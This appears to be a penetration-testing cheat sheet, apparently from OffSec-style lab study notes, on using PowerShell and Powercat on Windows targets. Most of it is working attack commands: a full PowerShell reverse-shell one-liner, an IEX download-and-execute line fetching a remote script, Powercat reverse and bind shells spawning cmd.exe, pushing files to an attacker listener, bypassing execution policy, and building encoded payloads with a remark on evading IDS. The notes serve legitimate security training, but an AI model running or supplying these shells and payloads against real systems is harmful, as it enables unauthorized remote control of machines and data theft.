> Platform: Windows

# PowerShell
Windows (already installed in Windows)
Default execution policy is "restricted". To set "unrestricted", launch Powershell as administrator:
- right click Windows button, then select "Windows PowerShell (Admin)"
- `Set-ExecutionPolicy Unrestricted`, enter `Y`
- check execution policy: `Get-ExecutionPolicy`

### File Transfer (over HTTP)
1. Set up Apache server
	- put file to be transferred (e.g. `wget.exe`) in `/var/www/html/`: `sudo cp wget.exe /var/www/html`
	- start Apache server: `sudo systemctl start apache2`
2. Download file on the Windows machine (in cmd)
	- `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`
		- `-c`: execute the supplied command (wrapped in double quotes) as if it were typed in the PowerShell prompt
		- `'http://10.11.0.4/wget.exe'`: source location (URI)
		- `'C:\Users\offsec\Desktop\wget.exe'`: target location where the downloaded file will be stored

Or (in PS): `iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe`

### Reverse Shell
1. Set up netcat listener on own machine: `sudo nc -nvlp 443`
2. Send reverse shell one-liner on target machine: 
```Powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

OR
```powershell
IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1')
```

### Bind Shell
1. Set up bind shell on target machine: `[very long one-liner]`
2. Connect to bind shell from own machine: `nc -nv 10.11.0.22 443`

### Execute b64 encoded command
1. Encode the command with Cyberchef:
   ![[Pasted image 20241204232252.png]]
2. `powershell -enc [encoded command here]`

### Running scripts

Allow running scripts:
`powershell -ep bypass`

Load script:
`. .\PowerUp.ps1`

# Powercat
the powershell version of netcat
simplifies creation of bind and reverse shells
Windows
https://github.com/besimorhino/powercat/tree/master

### Install Powercat in Windows
1. Open PowerShell
2. Load Powercat script into our PowerShell session (only available in the current instance): `. .\powercat.ps1`
3. Check if Powercat has loaded properly: `powercat -h` (should see the help manual)

### File Transfer (from target machine)
1. Set up netcat listener on own machine: `nc -nvlp 443 > receiving_powercat.ps1`
2. Invoke Powercat on target machine: `powercat -c 10.11.0.4 -p 443 -i C:\Tools\practical_tools\powercat.ps1`
	- `-c`: specify client mode
	- `10.11.0.4 -p 443`: specify remote IP address and port to connect to
	- `-i`: indicate the local file to be transferred to the listener
3. On own machine, kill netcat process and check if file has been received

### Reverse Shell
1. Set up netcat listener on own machine: `sudo nc -vlp 443`
2. On target machine, use powercat to send reverse shell: `powercat -c 10.11.0.4 -p 443 -e cmd.exe`
	- `-e`: specify the application to execute once connected to the listening port

### Bind Shell
1. create listener on target computer: `powercat -l -p 443 -e cmd.exe`
	- `-l`: create listener
	- `-p [port number]`: specify port number to listen to
	- `-e cmd.exe`: execute `cmd.exe` once connected
2. create netcat connection to the bind shell from own computer: `nc -nv 10.11.0.22 443`

### Stand-Alone Payloads
A generated PowerShell script using Powercat functionalities
- `[your payload] -g > filename.ps1`
- e.g. reverse shell payload
	- `powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1`
	- to execute: `reverseshell.ps1`
Standalone payloads may be easily detected by IDS.
Generate encoded payload:
- `[your payload] -ge > encodedfilename.ps1`
- to execute: `powershell.exe -E [paste entire encoded script here]`